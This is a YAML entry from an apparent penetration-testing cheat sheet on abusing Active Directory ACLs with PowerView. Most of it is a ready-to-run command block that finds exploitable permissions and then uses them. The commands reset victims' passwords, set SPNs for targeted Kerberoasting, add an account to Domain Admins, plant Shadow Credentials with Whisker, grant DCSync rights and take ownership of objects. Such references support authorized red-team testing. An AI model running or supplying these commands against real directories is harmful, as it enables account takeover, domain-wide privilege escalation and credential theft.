---
description: |
  Comprehensive AD ACL abuse using PowerView. Exploit GenericAll,
  GenericWrite, WriteDACL, WriteOwner, and ForceChangePassword.
command: |
  # Import PowerView
  . .\PowerView.ps1

  # Find exploitable ACLs
  Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "pentuser"}

  # GenericAll on User — reset password
  Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)

  # GenericAll on User — targeted Kerberoast (set SPN)
  Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/service'}
  # Then Kerberoast the user

  # GenericAll on Group — add member
  Add-DomainGroupMember -Identity "Domain Admins" -Members pentuser

  # GenericWrite on User — set SPN for Kerberoasting
  Set-DomainObject -Identity victim -Set @{serviceprincipalname='http/fake'}

  # GenericWrite on User — Shadow Credentials (with Whisker)
  .\Whisker.exe add /target:victim /domain:test.local /dc:10.10.10.1

  # WriteDACL — grant yourself DCSync rights
  Add-DomainObjectAcl -TargetIdentity "DC=test,DC=local" -PrincipalIdentity pentuser -Rights DCSync

  # WriteOwner — take ownership then modify DACL
  Set-DomainObjectOwner -Identity victim -OwnerIdentity pentuser
  Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity pentuser -Rights All

  # ForceChangePassword
  Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)
phase:
  - Exploitation
  - Post-Exploitation
target_os:
  - Windows
services:
  - LDAP
items:
  - Shell
  - Username
  - Password
techniques:
  - ACL_Abuse
  - Kerberoasting
  - DCSync
  - Shadow_Credentials
network_position:
  - Internal
  - Local
references:
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html
  - https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Methodology%20and%20Resources/Active%20Directory%20Attack/
---
